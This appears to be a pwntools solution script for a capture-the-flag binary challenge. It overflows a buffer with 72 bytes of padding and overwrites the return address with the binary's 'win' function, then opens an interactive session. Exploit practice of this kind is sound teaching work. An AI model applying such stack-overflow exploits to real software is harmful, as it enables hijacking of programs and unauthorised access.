from pwn import * 
context.binary = elf = ELF('./chalWHJ')
context.arch = 'amd64'

p = process()

offset = 72 
payload = b'A' * offset + p64(elf.symbols['win'])
p.sendline(payload)
p.interactive()
